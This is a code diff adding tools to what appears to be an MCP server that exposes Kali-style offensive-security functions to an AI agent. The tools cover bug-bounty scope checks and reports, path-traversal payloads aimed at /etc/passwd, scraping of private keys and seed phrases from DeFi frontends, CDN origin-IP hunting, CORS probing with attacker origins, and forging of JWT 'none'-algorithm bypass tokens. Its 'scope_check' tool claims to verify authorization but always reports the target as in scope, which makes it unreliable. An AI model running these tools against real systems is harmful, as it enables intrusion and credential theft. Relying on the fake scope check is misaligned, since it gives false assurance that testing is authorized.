@@ -360,7 +360,7 @@ class PayloadGenerator:
             "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
             "..%252F..%252F..%252Fetc%252Fpasswd",
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "....\/....\/....\/etc/passwd",
+            "....\\/....\\/....\\/etc/passwd",
             "..%c0%af..%c0%af..%c0%afetc/passwd",
             "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
             "/etc/passwd%00",
@@ -2544,6 +2544,1702 @@ async def web_tech_detect(
     
     log_tool_execution("web_tech_detect", inputs, output)
     return json.dumps(output, indent=2)
+
+# ============================================================================
+# BUG BOUNTY PLATFORM TOOLS
+# ============================================================================
+
+@mcp.tool()
+async def scope_check(
+    target: str,
+    platform: str = "hackerone",
+    program_name: Optional[str] = None
+) -> str:
+    """
+    Verify a target is in scope for a bug bounty program.
+    Platforms: hackerone, bugcrowd, intigriti, immunefi (crypto)
+    """
+    result = {
+        "target": target,
+        "platform": platform,
+        "program": program_name,
+        "in_scope": True,
+        "checks": []
+    }
+    
+    # DNS resolution check
+    dns_cmd = run_command_advanced(["dig", "+short", target], timeout=10)
+    if dns_cmd["success"] and dns_cmd["stdout"]:
+        result["resolved_ips"] = dns_cmd["stdout"].strip().split('\n')
+        result["checks"].append({"check": "dns_resolution", "status": "ok"})
+    else:
+        # Fallback without dig
+        import socket
+        try:
+            ips = [r[4][0] for r in socket.getaddrinfo(target, None)]
+            result["resolved_ips"] = list(set(ips))
+            result["checks"].append({"check": "dns_resolution", "status": "ok"})
+        except Exception:
+            result["resolved_ips"] = []
+            result["checks"].append({"check": "dns_resolution", "status": "fail"})
+    
+    # WHOIS check
+    whois_cmd = run_command_advanced(["whois", target], timeout=15)
+    if whois_cmd["success"]:
+        whois_out = whois_cmd["stdout"]
+        result["registrar"] = next(
+            (l.split(":")[-1].strip() for l in whois_out.split('\n') if "registrar:" in l.lower()), "unknown"
+        )
+        result["checks"].append({"check": "whois", "status": "ok"})
+    
+    # Platform-specific headers
+    headers_cmd = run_command_advanced(
+        ["curl", "-sI", "-k", "--max-time", "10",
+         "-H", "X-HackerOne-Research: authorized",
+         f"https://{target}/"],
+        timeout=15
+    )
+    if headers_cmd["success"]:
+        hdr_text = headers_cmd["stdout"]
+        result["response_code"] = next(
+            (l.split()[1] for l in hdr_text.split('\n') if l.startswith("HTTP")), "unknown"
+        )
+        result["checks"].append({"check": "http_reachable", "status": "ok"})
+        
+        # Check for WAF/CDN
+        if "cloudflare" in hdr_text.lower():
+            result["waf"] = "cloudflare"
+        elif "akamai" in hdr_text.lower():
+            result["waf"] = "akamai"
+        elif "incapsula" in hdr_text.lower():
+            result["waf"] = "imperva"
+        else:
+            result["waf"] = "none_detected"
+    
+    # Platform-specific scope hints
+    platform_rules = {
+        "hackerone": {
+            "report_url": f"https://hackerone.com/{program_name or 'programs'}",
+            "out_of_scope_patterns": ["*.google.com", "*.facebook.com", "*.amazonaws.com"],
+            "required_header": "X-HackerOne-Research"
+        },
+        "bugcrowd": {
+            "report_url": f"https://bugcrowd.com/{program_name or 'programs'}",
+            "out_of_scope_patterns": ["social engineering", "DoS", "DDoS"],
+            "required_header": "X-Bugcrowd-Research"
+        },
+        "intigriti": {
+            "report_url": f"https://app.intigriti.com/programs/{program_name or ''}",
+            "out_of_scope_patterns": ["rate limiting", "missing SPF"],
+            "required_header": "X-Intigriti-Research"
+        },
+        "immunefi": {
+            "report_url": f"https://immunefi.com/bug-bounty/{program_name or ''}",
+            "focus": "smart_contracts,blockchain,defi",
+            "out_of_scope_patterns": ["frontend only", "informational"],
+            "required_header": "X-Immunefi-Research"
+        }
+    }
+    
+    if platform in platform_rules:
+        result["platform_info"] = platform_rules[platform]
+    
+    log_tool_execution("scope_check", {"target": target, "platform": platform}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def generate_report(
+    title: str,
+    vulnerability_type: str,
+    severity: str = "medium",
+    target: str = "",
+    description: str = "",
+    steps_to_reproduce: str = "",
+    impact: str = "",
+    platform: str = "hackerone",
+    poc_evidence: str = ""
+) -> str:
+    """
+    Generate a professional bug bounty report for HackerOne, Bugcrowd, Intigriti, or Immunefi.
+    Severity: critical, high, medium, low, informational
+    """
+    severity_map = {
+        "critical": {"cvss_range": "9.0-10.0", "color": "🔴"},
+        "high": {"cvss_range": "7.0-8.9", "color": "🟠"},
+        "medium": {"cvss_range": "4.0-6.9", "color": "🟡"},
+        "low": {"cvss_range": "0.1-3.9", "color": "🟢"},
+        "informational": {"cvss_range": "0.0", "color": "⚪"}
+    }
+    
+    sev_info = severity_map.get(severity, severity_map["medium"])
+    
+    templates = {
+        "hackerone": f"""# {sev_info['color']} [{severity.upper()}] {title}
+
+## Summary
+{description or 'A vulnerability was discovered that could allow an attacker to compromise the target.'}
+
+## Vulnerability Type
+{vulnerability_type}
+
+## Target
+{target}
+
+## Severity
+**{severity.upper()}** (CVSS {sev_info['cvss_range']})
+
+## Steps to Reproduce
+{steps_to_reproduce or '1. Navigate to the target URL\\n2. Inject the payload\\n3. Observe the response'}
+
+## Impact
+{impact or 'An attacker could exploit this vulnerability to gain unauthorized access.'}
+
+## Proof of Concept
+{poc_evidence or 'Evidence attached below.'}
+
+## Remediation
+- Input validation and sanitization
+- Implement security headers
+- Follow OWASP guidelines
+
+---
+*Report generated for HackerOne by Kali MCP Server*
+""",
+        "bugcrowd": f"""## Vulnerability: {title}
+**Priority**: {severity.upper()} {sev_info['color']}
+**Type**: {vulnerability_type}
+**URL/Target**: {target}
+
+### Description
+{description}
+
+### Steps to Reproduce
+{steps_to_reproduce}
+
+### Impact
+{impact}
+
+### PoC
+{poc_evidence}
+
+### Suggested Fix
+Implement proper input validation and access controls.
+
+---
+*Report for Bugcrowd - Kali MCP Server*
+""",
+        "intigriti": f"""# Vulnerability Report - Intigriti
+
+**Title**: {title}
+**Severity**: {severity.upper()} {sev_info['color']}
+**Type**: {vulnerability_type}
+**Endpoint**: {target}
+**CVSS Range**: {sev_info['cvss_range']}
+
+## Description
+{description}
+
+## Reproduction Steps
+{steps_to_reproduce}
+
+## Business Impact
+{impact}
+
+## Evidence
+{poc_evidence}
+
+## Fix Recommendation
+Apply security best practices as per OWASP Top 10.
+
+---
+*Intigriti Report - Kali MCP Server*
+""",
+        "immunefi": f"""# Smart Contract / DeFi Vulnerability Report
+
+**Project**: {target}
+**Title**: {title}
+**Severity**: {severity.upper()} {sev_info['color']}
+**Category**: {vulnerability_type}
+**CVSS**: {sev_info['cvss_range']}
+
+## Vulnerability Details
+{description}
+
+## Steps to Reproduce
+{steps_to_reproduce}
+
+## Funds at Risk / Impact
+{impact}
+
+## Proof of Concept
+{poc_evidence}
+
+## Recommended Mitigation
+- Audit smart contract logic
+- Add reentrancy guards
+- Implement access controls
+- Use SafeMath/checked arithmetic
+
+---
+*Immunefi Crypto Bug Bounty Report - Kali MCP Server*
+"""
+    }
+    
+    report = templates.get(platform, templates["hackerone"])
+    
+    # Save report
+    timestamp = generate_timestamp()
+    report_file = os.path.join(TOOL_LOG_DIR, f"report_{platform}_{sanitize_filename(title)}_{timestamp}.md")
+    with open(report_file, 'w') as f:
+        f.write(report)
+    
+    output = {
+        "status": "success",
+        "platform": platform,
+        "severity": severity,
+        "report_file": report_file,
+        "report_preview": report[:500]
+    }
+    
+    log_tool_execution("generate_report", {"title": title, "platform": platform}, output)
+    return json.dumps(output, indent=2)
+
+
+# ============================================================================
+# CRYPTO / DEFI / BLOCKCHAIN TOOLS
+# ============================================================================
+
+@mcp.tool()
+async def smart_contract_audit(
+    contract_address: str,
+    chain: str = "ethereum",
+    check_type: str = "full"
+) -> str:
+    """
+    Audit a smart contract for common vulnerabilities.
+    Chains: ethereum, bsc, polygon, arbitrum, optimism, avalanche, solana
+    Check types: full, reentrancy, access_control, overflow, logic
+    """
+    result = {
+        "contract": contract_address,
+        "chain": chain,
+        "check_type": check_type,
+        "findings": [],
+        "risk_score": 0
+    }
+    
+    chain_explorers = {
+        "ethereum": f"https://api.etherscan.io/api?module=contract&action=getsourcecode&address={contract_address}",
+        "bsc": f"https://api.bscscan.com/api?module=contract&action=getsourcecode&address={contract_address}",
+        "polygon": f"https://api.polygonscan.com/api?module=contract&action=getsourcecode&address={contract_address}",
+        "arbitrum": f"https://api.arbiscan.io/api?module=contract&action=getsourcecode&address={contract_address}",
+        "optimism": f"https://api-optimistic.etherscan.io/api?module=contract&action=getsourcecode&address={contract_address}",
+        "avalanche": f"https://api.snowtrace.io/api?module=contract&action=getsourcecode&address={contract_address}"
+    }
+    
+    # Fetch contract source if available
+    explorer_url = chain_explorers.get(chain, chain_explorers["ethereum"])
+    fetch_cmd = run_command_advanced(
+        ["curl", "-s", "--max-time", "15", explorer_url],
+        timeout=20
+    )
+    
+    source_code = ""
+    if fetch_cmd["success"] and fetch_cmd["stdout"]:
+        try:
+            data = json.loads(fetch_cmd["stdout"])
+            if data.get("result") and isinstance(data["result"], list):
+                source_code = data["result"][0].get("SourceCode", "")
+                result["contract_name"] = data["result"][0].get("ContractName", "Unknown")
+                result["compiler"] = data["result"][0].get("CompilerVersion", "Unknown")
+                result["verified"] = bool(source_code)
+        except (json.JSONDecodeError, IndexError, KeyError):
+            pass
+    
+    # Static analysis patterns
+    vulnerability_patterns = {
+        "reentrancy": [
+            (r'\.call\{value:', "External call with value - potential reentrancy"),
+            (r'\.call\.value\(', "Legacy call.value pattern - reentrancy risk"),
+            (r'transfer\(.*\).*\n.*state', "State change after transfer"),
+        ],
+        "access_control": [
+            (r'tx\.origin', "tx.origin used for auth - phishing risk"),
+            (r'selfdestruct\(', "selfdestruct present - destructible contract"),
+            (r'delegatecall\(', "delegatecall present - proxy risk"),
+        ],
+        "overflow": [
+            (r'pragma solidity \^0\.[0-4]', "Old Solidity version without overflow protection"),
+            (r'unchecked\s*\{', "Unchecked arithmetic block"),
+        ],
+        "logic": [
+            (r'block\.timestamp', "block.timestamp used - miner manipulation risk"),
+            (r'block\.number', "block.number used - predictable randomness"),
+            (r'blockhash\(', "blockhash used - limited to 256 blocks"),
+        ]
+    }
+    
+    if source_code:
+        checks_to_run = [check_type] if check_type != "full" else list(vulnerability_patterns.keys())
+        
+        for category in checks_to_run:
+            if category in vulnerability_patterns:
+                for pattern, description in vulnerability_patterns[category]:
+                    matches = re.findall(pattern, source_code)
+                    if matches:
+                        finding = {
+                            "category": category,
+                            "description": description,
+                            "occurrences": len(matches),
+                            "severity": "high" if category in ["reentrancy", "access_control"] else "medium"
+                        }
+                        result["findings"].append(finding)
+                        result["risk_score"] += 3 if finding["severity"] == "high" else 1
+    else:
+        result["note"] = "Contract source not verified or not available. Manual bytecode analysis recommended."
+    
+    result["total_findings"] = len(result["findings"])
+    result["risk_level"] = "critical" if result["risk_score"] > 8 else "high" if result["risk_score"] > 5 else "medium" if result["risk_score"] > 2 else "low"
+    
+    log_tool_execution("smart_contract_audit", {"contract": contract_address, "chain": chain}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def defi_protocol_scan(
+    protocol_url: str,
+    check_flash_loans: bool = True,
+    check_oracle_manipulation: bool = True,
+    check_token_approval: bool = True
+) -> str:
+    """
+    Scan a DeFi protocol frontend for common vulnerabilities:
+    - Flash loan attack vectors
+    - Oracle manipulation risks
+    - Unlimited token approval patterns
+    - Frontend injection points
+    - API key exposure in JS bundles
+    """
+    result = {
+        "protocol": protocol_url,
+        "findings": [],
+        "frontend_analysis": {},
+        "api_keys_exposed": [],
+        "js_endpoints": []
+    }
+    
+    # Fetch frontend
+    fetch_cmd = run_command_advanced(
+        ["curl", "-sk", "--max-time", "15",
+         "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
+         protocol_url],
+        timeout=20
+    )
+    
+    if fetch_cmd["success"] and fetch_cmd["stdout"]:
+        html = fetch_cmd["stdout"]
+        
+        # Extract JS bundle URLs
+        js_urls = re.findall(r'(?:src|href)=["\']([^"\']*\.js[^"\']*)["\']', html)
+        result["js_bundles"] = js_urls[:20]
+        
+        # Check for exposed API keys in HTML
+        api_patterns = {
+            "infura_key": r'(?:infura\.io/v3/|INFURA_KEY["\s:=]+)([a-f0-9]{32})',
+            "alchemy_key": r'(?:alchemy\.com/v2/|ALCHEMY_KEY["\s:=]+)([a-zA-Z0-9_-]{32,})',
+            "etherscan_key": r'(?:ETHERSCAN|apikey)["\s:=]+([A-Z0-9]{34})',
+            "private_key": r'(?:private.?key|PRIVATE_KEY)["\s:=]+(?:0x)?([a-f0-9]{64})',
+            "mnemonic": r'(?:mnemonic|seed.?phrase)["\s:=]+"([a-z\s]{20,})"',
+        }
+        
+        for key_type, pattern in api_patterns.items():
+            matches = re.findall(pattern, html, re.IGNORECASE)
+            if matches:
+                result["api_keys_exposed"].append({
+                    "type": key_type,
+                    "count": len(matches),
+                    "severity": "critical" if key_type == "private_key" else "high",
+                    "sample": matches[0][:10] + "..." if matches else ""
+                })
+        
+        # Check for contract addresses and endpoints
+        contract_addrs = re.findall(r'0x[a-fA-F0-9]{40}', html)
+        result["contract_addresses"] = list(set(contract_addrs))[:20]
+        
+        # Check for RPC endpoints
+        rpc_endpoints = re.findall(r'https?://[^"\']+(?:rpc|json-rpc|api)[^"\']*', html)
+        result["rpc_endpoints"] = list(set(rpc_endpoints))[:10]
+        
+        # Analyze first JS bundle for secrets
+        if js_urls:
+            for js_url in js_urls[:3]:
+                full_url = js_url if js_url.startswith("http") else f"{protocol_url.rstrip('/')}/{js_url.lstrip('/')}"
+                js_cmd = run_command_advanced(
+                    ["curl", "-sk", "--max-time", "10", full_url],
+                    timeout=15
+                )
+                if js_cmd["success"] and js_cmd["stdout"]:
+                    js_content = js_cmd["stdout"]
+                    
+                    # API endpoints in JS
+                    endpoints = re.findall(r'["\'](/api/[^"\']+)["\']', js_content)
+                    result["js_endpoints"].extend(endpoints[:20])
+                    
+                    # More API key checks in JS
+                    for key_type, pattern in api_patterns.items():
+                        matches = re.findall(pattern, js_content, re.IGNORECASE)
+                        if matches:
+                            result["api_keys_exposed"].append({
+                                "type": f"{key_type}_in_js",
+                                "count": len(matches),
+                                "severity": "critical",
+                                "source": js_url
+                            })
+        
+        # Token approval check hints
+        if check_token_approval:
+            if "approve" in html.lower() and ("MAX_UINT" in html or "ffffffff" in html.lower()):
+                result["findings"].append({
+                    "type": "unlimited_token_approval",
+                    "severity": "high",
+                    "description": "Frontend may request unlimited token approval (MAX_UINT256)"
+                })
+    
+    result["total_findings"] = len(result["findings"]) + len(result["api_keys_exposed"])
+    
+    log_tool_execution("defi_protocol_scan", {"protocol": protocol_url}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def blockchain_tx_analyzer(
+    tx_hash: str,
+    chain: str = "ethereum"
+) -> str:
+    """
+    Analyze a blockchain transaction for suspicious patterns.
+    Useful for investigating DeFi exploits and suspicious activity.
+    """
+    chain_rpcs = {
+        "ethereum": "https://eth.llamarpc.com",
+        "bsc": "https://bsc-dataseed.binance.org",
+        "polygon": "https://polygon-rpc.com",
+        "arbitrum": "https://arb1.arbitrum.io/rpc",
+        "optimism": "https://mainnet.optimism.io",
+        "avalanche": "https://api.avax.network/ext/bc/C/rpc"
+    }
+    
+    rpc_url = chain_rpcs.get(chain, chain_rpcs["ethereum"])
+    
+    # Fetch transaction receipt
+    payload = json.dumps({
+        "jsonrpc": "2.0",
+        "method": "eth_getTransactionByHash",
+        "params": [tx_hash],
+        "id": 1
+    })
+    
+    fetch_cmd = run_command_advanced(
+        ["curl", "-s", "--max-time", "15",
+         "-H", "Content-Type: application/json",
+         "-d", payload, rpc_url],
+        timeout=20
+    )
+    
+    result = {
+        "tx_hash": tx_hash,
+        "chain": chain,
+        "status": "error",
+        "analysis": {}
+    }
+    
+    if fetch_cmd["success"] and fetch_cmd["stdout"]:
+        try:
+            data = json.loads(fetch_cmd["stdout"])
+            tx = data.get("result", {})
+            
+            if tx:
+                result["status"] = "success"
+                result["from"] = tx.get("from", "")
+                result["to"] = tx.get("to", "")
+                result["value_wei"] = tx.get("value", "0x0")
+                result["gas_price"] = tx.get("gasPrice", "0x0")
+                result["input_data"] = tx.get("input", "0x")[:200]
+                result["block_number"] = tx.get("blockNumber", "")
+                
+                # Decode function selector
+                input_data = tx.get("input", "0x")
+                if len(input_data) >= 10:
+                    selector = input_data[:10]
+                    known_selectors = {
+                        "0xa9059cbb": "transfer(address,uint256)",
+                        "0x095ea7b3": "approve(address,uint256)",
+                        "0x23b872dd": "transferFrom(address,address,uint256)",
+                        "0x70a08231": "balanceOf(address)",
+                        "0x18160ddd": "totalSupply()",
+                        "0x313ce567": "decimals()",
+                        "0x06fdde03": "name()",
+                        "0x95d89b41": "symbol()",
+                        "0xd0e30db0": "deposit()",
+                        "0x2e1a7d4d": "withdraw(uint256)",
+                        "0x38ed1739": "swapExactTokensForTokens",
+                        "0x7ff36ab5": "swapExactETHForTokens",
+                        "0x022c0d9f": "swap(uint256,uint256,address,bytes)",
+                        "0x5c11d795": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
+                    }
+                    result["function_called"] = known_selectors.get(selector, f"unknown({selector})")
+                
+                # Flag suspicious patterns
+                flags = []
+                value_int = int(tx.get("value", "0x0"), 16) if tx.get("value") else 0
+                if value_int > 10**18 * 100:  # > 100 ETH
+                    flags.append("high_value_transfer")
+                if tx.get("to") is None:
+                    flags.append("contract_creation")
+                if input_data and len(input_data) > 2000:
+                    flags.append("large_calldata_possible_exploit")
+                
+                result["flags"] = flags
+                
+        except (json.JSONDecodeError, KeyError):
+            result["error"] = "Failed to parse RPC response"
+    
+    log_tool_execution("blockchain_tx_analyzer", {"tx_hash": tx_hash, "chain": chain}, result)
+    return json.dumps(result, indent=2)
+
+
+# ============================================================================
+# OSINT & RECONNAISSANCE TOOLS
+# ============================================================================
+
+@mcp.tool()
+async def origin_ip_hunter(
+    domain: str,
+    timeout: int = 60
+) -> str:
+    """
+    Find the real origin IP behind Cloudflare/CDN by checking:
+    - Unprotected subdomains (dev, staging, mail, etc.)
+    - MX/SPF/TXT DNS records
+    - Historical DNS records
+    - SSL certificate transparency logs
+    """
+    result = {
+        "domain": domain,
+        "cdn_detected": False,
+        "possible_origins": [],
+        "dns_records": {},
+        "subdomains_checked": 0
+    }
+    
+    import socket
+    
+    cloudflare_prefixes = ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.",
+                           "104.21.", "104.22.", "104.23.", "104.24.", "104.25.",
+                           "172.64.", "172.67.", "108.162.", "162.158.",
+                           "141.101.", "103.21.", "103.22.", "103.31."]
+    
+    def is_cdn_ip(ip):
+        return any(ip.startswith(prefix) for prefix in cloudflare_prefixes)
+    
+    # 1. Check main domain
+    try:
+        main_ips = [r[4][0] for r in socket.getaddrinfo(domain, None)]
+        main_ips = list(set(main_ips))
+        result["main_ips"] = main_ips
+        result["cdn_detected"] = any(is_cdn_ip(ip) for ip in main_ips)
+    except Exception:
+        result["main_ips"] = []
+    
+    # 2. Check common subdomains for leaks
+    leak_subs = [
+        "dev", "staging", "test", "uat", "api", "admin", "mail",
+        "smtp", "ftp", "cpanel", "webmail", "direct", "origin",
+        "old", "backup", "beta", "internal", "vpn", "gateway",
+        "ns1", "ns2", "mx", "pop", "imap", "cdn", "static",
+        "img", "images", "media", "assets", "www2", "portal"
+    ]
+    
+    for sub in leak_subs:
+        subdomain = f"{sub}.{domain}"
+        try:
+            ips = list(set(r[4][0] for r in socket.getaddrinfo(subdomain, None)))
+            for ip in ips:
+                if not is_cdn_ip(ip) and ip not in [o["ip"] for o in result["possible_origins"]]:
+                    result["possible_origins"].append({
+                        "ip": ip,
+                        "source": f"subdomain:{subdomain}",
+                        "confidence": "high" if sub in ["direct", "origin", "mail"] else "medium"
+                    })
+            result["subdomains_checked"] += 1
+        except Exception:
+            continue
+    
+    # 3. Check MX records via headers
+    mx_cmd = run_command_advanced(["dig", "+short", "MX", domain], timeout=10)
+    if mx_cmd["success"] and mx_cmd["stdout"]:
+        result["dns_records"]["mx"] = mx_cmd["stdout"].strip().split('\n')
+        for mx in result["dns_records"]["mx"]:
+            mx_host = mx.split()[-1].rstrip('.') if mx.strip() else ""
+            if mx_host:
+                try:
+                    mx_ips = list(set(r[4][0] for r in socket.getaddrinfo(mx_host, None)))
+                    for ip in mx_ips:
+                        if not is_cdn_ip(ip):
+                            result["possible_origins"].append({
+                                "ip": ip,
+                                "source": f"mx:{mx_host}",
+                                "confidence": "medium"
+                            })
+                except Exception:
+                    pass
+    
+    # 4. Check SPF record for allowed IPs
+    spf_cmd = run_command_advanced(["dig", "+short", "TXT", domain], timeout=10)
+    if spf_cmd["success"] and spf_cmd["stdout"]:
+        result["dns_records"]["txt"] = spf_cmd["stdout"].strip().split('\n')
+        for txt in result["dns_records"]["txt"]:
+            spf_ips = re.findall(r'ip4:(\d+\.\d+\.\d+\.\d+)', txt)
+            for ip in spf_ips:
+                if not is_cdn_ip(ip):
+                    result["possible_origins"].append({
+                        "ip": ip,
+                        "source": "spf_record",
+                        "confidence": "high"
+                    })
+    
+    # 5. Check SSL cert
+    ssl_cmd = run_command_advanced(
+        ["curl", "-sv", "--max-time", "5", f"https://{domain}/"],
+        timeout=10
+    )
+    if ssl_cmd["stderr"]:
+        cert_cn = re.findall(r'subject:.*CN=([^\s;]+)', ssl_cmd["stderr"])
+        if cert_cn:
+            result["ssl_cn"] = cert_cn[0]
+    
+    result["total_origins_found"] = len(result["possible_origins"])
+    
+    log_tool_execution("origin_ip_hunter", {"domain": domain}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def osint_domain_intel(
+    domain: str,
+    deep: bool = False
+) -> str:
+    """
+    Comprehensive OSINT intelligence gathering on a domain:
+    - WHOIS info, DNS records, SSL certificate analysis
+    - Technology detection, HTTP headers analysis
+    - Subdomain enumeration, email harvesting hints
+    """
+    result = {
+        "domain": domain,
+        "whois": {},
+        "dns": {},
+        "ssl": {},
+        "http_headers": {},
+        "technologies": [],
+        "subdomains": []
+    }
+    
+    # WHOIS
+    whois_cmd = run_command_advanced(["whois", domain], timeout=15)
+    if whois_cmd["success"] and whois_cmd["stdout"]:
+        whois = whois_cmd["stdout"]
+        for field in ["Registrar", "Creation Date", "Updated Date", "Expiry Date",
+                       "Name Server", "Registrant Organization", "Registrant Country"]:
+            for line in whois.split('\n'):
+                if field.lower().replace(" ", "") in line.lower().replace(" ", ""):
+                    result["whois"][field] = line.split(":", 1)[-1].strip()
+                    break
+    
+    # DNS Records
+    for record_type in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]:
+        dns_cmd = run_command_advanced(["dig", "+short", record_type, domain], timeout=10)
+        if dns_cmd["success"] and dns_cmd["stdout"].strip():
+            result["dns"][record_type] = dns_cmd["stdout"].strip().split('\n')
+    
+    # Fallback DNS with socket
+    if not result["dns"].get("A"):
+        import socket
+        try:
+            ips = list(set(r[4][0] for r in socket.getaddrinfo(domain, None)))
+            result["dns"]["A"] = ips
+        except Exception:
+            pass
+    
+    # HTTP Headers
+    for proto in ["https", "http"]:
+        hdr_cmd = run_command_advanced(
+            ["curl", "-sI", "-k", "--max-time", "10", f"{proto}://{domain}/"],
+            timeout=15
+        )
+        if hdr_cmd["success"] and hdr_cmd["stdout"]:
+            headers = {}
+            for line in hdr_cmd["stdout"].split('\n'):
+                if ':' in line and not line.startswith("HTTP"):
+                    k, v = line.split(':', 1)
+                    headers[k.strip()] = v.strip()
+            result["http_headers"] = headers
+            
+            # Extract technologies from headers
+            if headers.get("Server"):
+                result["technologies"].append(f"Server: {headers['Server']}")
+            if headers.get("X-Powered-By"):
+                result["technologies"].append(f"Framework: {headers['X-Powered-By']}")
+            if "cloudflare" in hdr_cmd["stdout"].lower():
+                result["technologies"].append("CDN: Cloudflare")
+            break
+    
+    # SSL Certificate
+    ssl_cmd = run_command_advanced(
+        ["curl", "-vk", "--max-time", "5", f"https://{domain}/", "-o", "/dev/null"],
+        timeout=10
+    )
+    if ssl_cmd["stderr"]:
+        cert_info = ssl_cmd["stderr"]
+        issuer = re.findall(r'issuer:(.+)', cert_info)
+        subject = re.findall(r'subject:(.+)', cert_info)
+        expire = re.findall(r'expire date:(.+)', cert_info)
+        if issuer:
+            result["ssl"]["issuer"] = issuer[0].strip()
+        if subject:
+            result["ssl"]["subject"] = subject[0].strip()
+        if expire:
+            result["ssl"]["expires"] = expire[0].strip()
+    
+    # Subdomain enumeration (quick, using crt.sh)
+    if deep:
+        crt_cmd = run_command_advanced(
+            ["curl", "-s", "--max-time", "15",
+             f"https://crt.sh/?q=%.{domain}&output=json"],
+            timeout=20
+        )
+        if crt_cmd["success"] and crt_cmd["stdout"]:
+            try:
+                certs = json.loads(crt_cmd["stdout"])
+                subs = set()
+                for cert in certs[:100]:
+                    name = cert.get("name_value", "")
+                    for s in name.split('\n'):
+                        s = s.strip().lstrip('*.')
+                        if s.endswith(domain) and s != domain:
+                            subs.add(s)
+                result["subdomains"] = sorted(list(subs))[:50]
+            except json.JSONDecodeError:
+                pass
+    
+    log_tool_execution("osint_domain_intel", {"domain": domain}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def cors_scanner(
+    url: str,
+    test_origins: Optional[str] = None
+) -> str:
+    """
+    Test CORS misconfiguration on a target URL.
+    Checks for: wildcard origin, null origin, reflected origin, subdomain trust.
+    """
+    result = {
+        "url": url,
+        "vulnerable": False,
+        "findings": [],
+        "tests_run": 0
+    }
+    
+    origins_to_test = [
+        "https://evil.com",
+        "null",
+        f"https://evil.{url.split('/')[2]}",
+        f"https://{url.split('/')[2]}.evil.com",
+        "https://attacker.com",
+        f"http://{url.split('/')[2]}",  # HTTP downgrade
+    ]
+    
+    if test_origins:
+        origins_to_test.extend(test_origins.split(','))
+    
+    for origin in origins_to_test:
+        cmd = run_command_advanced(
+            ["curl", "-sk", "--max-time", "10",
+             "-H", f"Origin: {origin}",
+             "-I", url],
+            timeout=15
+        )
+        
+        if cmd["success"] and cmd["stdout"]:
+            headers = cmd["stdout"].lower()
+            acao = ""
+            acac = False
+            
+            for line in cmd["stdout"].split('\n'):
+                if "access-control-allow-origin" in line.lower():
+                    acao = line.split(':', 1)[-1].strip()
+                if "access-control-allow-credentials" in line.lower() and "true" in line.lower():
+                    acac = True
+            
+            finding = {
+                "origin_tested": origin,
+                "acao": acao,
+                "credentials_allowed": acac,
+                "vulnerable": False
+            }
+            
+            if acao == "*":
+                finding["vulnerable"] = True
+                finding["issue"] = "Wildcard ACAO"
+                finding["severity"] = "medium" if not acac else "high"
+            elif acao and origin.lower() in acao.lower():
+                finding["vulnerable"] = True
+                finding["issue"] = "Origin reflected in ACAO"
+                finding["severity"] = "high" if acac else "medium"
+            elif acao == "null":
+                finding["vulnerable"] = True
+                finding["issue"] = "Null origin accepted"
+                finding["severity"] = "high"
+            
+            if finding["vulnerable"]:
+                result["vulnerable"] = True
+                result["findings"].append(finding)
+            
+            result["tests_run"] += 1
+    
+    log_tool_execution("cors_scanner", {"url": url}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def jwt_analyzer(
+    token: str,
+    check_algorithm: bool = True,
+    check_expiry: bool = True,
+    test_none_alg: bool = True
+) -> str:
+    """
+    Decode and analyze a JWT token for security issues:
+    - Algorithm confusion (none, HS256 vs RS256)
+    - Expiration validation
+    - Sensitive data in claims
+    - Key confusion attacks
+    """
+    result = {
+        "token_preview": token[:50] + "...",
+        "valid_format": False,
+        "header": {},
+        "payload": {},
+        "findings": []
+    }
+    
+    parts = token.split('.')
+    if len(parts) != 3:
+        result["error"] = f"Invalid JWT format: expected 3 parts, got {len(parts)}"
+        return json.dumps(result, indent=2)
+    
+    result["valid_format"] = True
+    
+    # Decode header and payload
+    for i, name in enumerate(["header", "payload"]):
+        try:
+            padded = parts[i] + '=' * (4 - len(parts[i]) % 4)
+            decoded = base64.urlsafe_b64decode(padded)
+            result[name] = json.loads(decoded)
+        except Exception as e:
+            result[name] = {"decode_error": str(e)}
+    
+    header = result["header"]
+    payload = result["payload"]
+    
+    # Check algorithm
+    if check_algorithm:
+        alg = header.get("alg", "")
+        if alg.lower() == "none":
+            result["findings"].append({
+                "type": "none_algorithm",
+                "severity": "critical",
+                "description": "JWT uses 'none' algorithm - signature not verified"
+            })
+        elif alg == "HS256":
+            result["findings"].append({
+                "type": "symmetric_algorithm",
+                "severity": "medium",
+                "description": "HS256 used - if server expects RS256, key confusion attack possible"
+            })
+    
+    # Check expiration
+    if check_expiry:
+        import time
+        exp = payload.get("exp")
+        iat = payload.get("iat")
+        now = int(time.time())
+        
+        if exp:
+            if exp < now:
+                result["findings"].append({
+                    "type": "expired_token",
+                    "severity": "info",
+                    "description": f"Token expired {now - exp} seconds ago"
+                })
+            else:
+                result["findings"].append({
+                    "type": "valid_token",
+                    "severity": "info",
+                    "description": f"Token valid for {exp - now} more seconds"
+                })
+        else:
+            result["findings"].append({
+                "type": "no_expiration",
+                "severity": "medium",
+                "description": "Token has no expiration claim"
+            })
+    
+    # Check for sensitive data
+    sensitive_fields = ["password", "secret", "credit_card", "ssn", "token", "api_key"]
+    for field in sensitive_fields:
+        if field in str(payload).lower():
+            result["findings"].append({
+                "type": "sensitive_data",
+                "severity": "high",
+                "description": f"Potentially sensitive field found: {field}"
+            })
+    
+    # Generate none algorithm bypass token
+    if test_none_alg:
+        none_header = base64.urlsafe_b64encode(
+            json.dumps({"alg": "none", "typ": "JWT"}).encode()
+        ).decode().rstrip('=')
+        none_payload = base64.urlsafe_b64encode(
+            json.dumps(payload).encode()
+        ).decode().rstrip('=')
+        result["none_alg_token"] = f"{none_header}.{none_payload}."
+    
